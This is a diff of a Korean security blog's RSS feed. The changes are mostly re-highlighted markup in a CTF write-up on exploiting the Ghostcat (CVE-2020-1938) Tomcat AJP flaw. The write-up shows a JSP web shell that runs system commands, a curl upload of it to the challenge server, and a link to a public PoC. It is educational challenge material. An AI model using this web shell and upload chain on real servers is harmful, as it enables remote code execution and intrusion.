@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[JaeSeoKim's Blog]]></title><description><![CDATA[Develop, Security, It, Etc...]]></description><link>https://jaeseokim.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Tue, 15 Sep 2020 22:08:21 GMT</lastBuildDate><item><title><![CDATA[[Github] Codespaces Beta 후기]]></title><description><![CDATA[이번에 Github의 새로운 feature 기능인 Codespaces의 베타에 당첨되어 한번 글을 작성하게 되었습니다. Codespaces 란? Codespaces는 Github에서 새롭게 지원하게 되는 기능 중 하나입니다. 기존 Github…]]></description><link>https://jaeseokim.github.io/Etc/github-codespaces-beta-review/</link><guid isPermaLink="false">https://jaeseokim.github.io/Etc/github-codespaces-beta-review/</guid><pubDate>Mon, 14 Sep 2020 19:13:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://github.com/features/codespaces&quot;&gt;&lt;span
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[JaeSeoKim's Blog]]></title><description><![CDATA[Develop, Security, It, Etc...]]></description><link>https://jaeseokim.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Thu, 17 Sep 2020 09:24:09 GMT</lastBuildDate><item><title><![CDATA[[Github] Codespaces Beta 후기]]></title><description><![CDATA[이번에 Github의 새로운 feature 기능인 Codespaces의 베타에 당첨되어 한번 글을 작성하게 되었습니다. Codespaces 란? Codespaces는 Github에서 새롭게 지원하게 되는 기능 중 하나입니다. 기존 Github…]]></description><link>https://jaeseokim.github.io/Etc/github-codespaces-beta-review/</link><guid isPermaLink="false">https://jaeseokim.github.io/Etc/github-codespaces-beta-review/</guid><pubDate>Mon, 14 Sep 2020 19:13:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://github.com/features/codespaces&quot;&gt;&lt;span
       class=&quot;gatsby-resp-image-wrapper&quot;
       style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; &quot;
     &gt;
@@ -2860,7 +2860,7 @@
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&quot;poc-코드&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#poc-%EC%BD%94%EB%93%9C&quot; aria-label=&quot;poc 코드 permalink&quot; class=&quot;toc-header before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;POC 코드&lt;/h3&gt;
-&lt;p&gt;​ &lt;a href=&quot;https://github.com/w4fz5uck5/CVE-2020-1938-Clean-Version&quot;&gt;https://github.com/w4fz5uck5/CVE-2020-1938-Clean-Version&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/w4fz5uck5/CVE-2020-1938-Clean-Version&quot;&gt;https://github.com/w4fz5uck5/CVE-2020-1938-Clean-Version&lt;/a&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;em&gt;POC 코드는 테스트 용도로만 사용이 되어야 합니다. 실제 서비스 중인 서버에 사용을 하는 것은 분명한 공격행위 입니다. 모든 행동에 대한 책임은 본인에게 있다는 것을 주의 하시길 바랍니다.&lt;/em&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -3123,27 +3123,49 @@
 &lt;p&gt;분석을 해보면 이 서블릿과 맵핑이된 &lt;code&gt;/ServeScreenshot&lt;/code&gt; 으로 post 방식의 파일 업로드 요청과 파라미터로 &lt;code&gt;submit=true&lt;/code&gt; 값이 들어오게 되면 그 파일을 &lt;code&gt;/uploads&lt;/code&gt; 밑에 저장을 하게 되는데 이때 이름은 올릴때 사용한 이름의 MD5 값으로 하여 파일을 저장 합니다.&lt;/p&gt;
 &lt;p&gt;이것을 통해 &lt;code&gt;Ghostcat&lt;/code&gt; 취약점을 이용한 &lt;code&gt;RCE&lt;/code&gt; 공격의 조건이 성립 되었습니다.&lt;/p&gt;
 &lt;p&gt;이제 아래의 내용이 작성된 JSP 웹쉘을 업로드 합니다.&lt;/p&gt;
-&lt;pre class=&quot;grvsc-container one-dark-pro&quot; data-language=&quot;jsp&quot; data-index=&quot;5&quot;&gt;&lt;code class=&quot;grvsc-code&quot;&gt;&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;page import=&amp;quot;java.io.*&amp;quot; %&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk9&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;%&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;  try {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        Process child = Runtime.getRuntime().exec(&amp;quot;ls -la&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        InputStream in = child.getInputStream();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        int c;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        while ((c = in.read()) != -1) {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;            out.print((char)c);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        in.close();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        try {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;            child.waitFor();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        } catch (InterruptedException e) {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;            e.printStackTrace();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;    } catch (IOException e) {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;        System.err.println(e);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;%&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&quot;grvsc-container one-dark-pro&quot; data-language=&quot;java&quot; data-index=&quot;5&quot;&gt;&lt;code class=&quot;grvsc-code&quot;&gt;&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk8&quot;&gt;&amp;lt;%&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; page import&lt;/span&gt;&lt;span class=&quot;mtk8&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mtk6&quot;&gt;&amp;quot;java.io.*&amp;quot;&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mtk8&quot;&gt;%&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk8&quot;&gt;&amp;lt;%&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;mtk10&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mtk11&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; child &lt;/span&gt;&lt;span class=&quot;mtk8&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; Runtime&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mtk6&quot;&gt;&amp;quot;ls -la&amp;quot;&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mtk11&quot;&gt;InputStream&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; in &lt;/span&gt;&lt;span class=&quot;mtk8&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; child&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mtk10&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; c&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mtk10&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; ((c &lt;/span&gt;&lt;span class=&quot;mtk8&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; in&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt;) &lt;/span&gt;&lt;span class=&quot;mtk8&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mtk8&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mtk7&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt;) {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;            out&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mtk10&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;)c);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        in&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mtk10&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;            child&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;waitFor&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        } &lt;/span&gt;&lt;span class=&quot;mtk10&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; (&lt;/span&gt;&lt;span class=&quot;mtk11&quot;&gt;InterruptedException&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mtk4 mtki&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt;) {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;            e&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;    } &lt;/span&gt;&lt;span class=&quot;mtk10&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; (&lt;/span&gt;&lt;span class=&quot;mtk11&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mtk4 mtki&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt;) {&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;        System&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk4&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mtk3&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt;(e);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk4&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk8&quot;&gt;%&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;pre class=&quot;grvsc-container one-dark-pro&quot; data-language=&quot;sh&quot; data-index=&quot;6&quot;&gt;&lt;code class=&quot;grvsc-code&quot;&gt;&lt;span class=&quot;grvsc-line&quot;&gt;&lt;span class=&quot;grvsc-source&quot;&gt;&lt;span class=&quot;mtk1&quot;&gt;curl -i -X POST -F &lt;/span&gt;&lt;span class=&quot;mtk6&quot;&gt;&amp;#39;file=@/root/cmd.jsp&amp;#39;&lt;/span&gt;&lt;span class=&quot;mtk1&quot;&gt; http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot?submit=true&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;image/Ghostcatcve-2020-1938-CNVD-2020-10487-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9D%B4%EB%9E%80-%ED%86%B0%EC%BA%A3-AJP-%EC%B7%A8%EC%95%BD%EC%A0%90-Feat-VolgaCTF-2020-Qualifier-NetCorp/image-20200330173801448.png&quot; alt=&quot;image-20200330173801448&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 9.499999999999998%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsSAAALEgHS3X78AAAAYElEQVQI14WMQQoCMRAE9y1JYM1kMjtmjAri/59Vrrl68FAUDUVvt/nC7m8sHviYeEx6N+plR2pFRM7daa0tVPXHZraaL5tH8BxB1Ib5QM0RPdjlDI7rOkwpUUoh5/yXDyYuO/PIWk0DAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;image-20200330173801448&quot;
+        title=&quot;image-20200330173801448&quot;
+        src=&quot;/static/c4bb175a134a86d4f20ffb911aa08dac/5a190/image-20200330173801448.png&quot;
+        srcset=&quot;/static/c4bb175a134a86d4f20ffb911aa08dac/772e8/image-20200330173801448.png 200w,
+/static/c4bb175a134a86d4f20ffb911aa08dac/e17e5/image-20200330173801448.png 400w,
+/static/c4bb175a134a86d4f20ffb911aa08dac/5a190/image-20200330173801448.png 800w,
+/static/c4bb175a134a86d4f20ffb911aa08dac/c1b63/image-20200330173801448.png 1200w,
+/static/c4bb175a134a86d4f20ffb911aa08dac/d9ed0/image-20200330173801448.png 1415w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;이제 &lt;code&gt;/uploads/2079f2ab870589bf5c5ddc9ac5030097&lt;/code&gt; (cmd.jsp md5 hash 값)을 ajp로 요청 하여 RCE 합니다.&lt;/p&gt;
 &lt;p&gt;이때 POC 코드를 조금 수정을 합니다. 기존 POC 코드는 파일을 읽어들이고 실제로 JSP 파일로써 실행이 불가능 하게 되어 있는데 이때 요청 하는 uri를 &lt;code&gt;/index.jsp&lt;/code&gt; 같이 jsp 확장자로 인식하도록 합니다.&lt;/p&gt;
 &lt;p&gt;&lt;span
@@ -3324,7 +3346,6 @@
   .one-dark-pro .mtk11 { color: #E5C07B; }
   .one-dark-pro .mtk8 { color: #56B6C2; }
   .one-dark-pro .mtk3 { color: #61AFEF; }
-  .one-dark-pro .mtk9 { color: #FFFFFF; }
   .one-dark-pro .grvsc-line-highlighted::before {
     background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));
     box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));
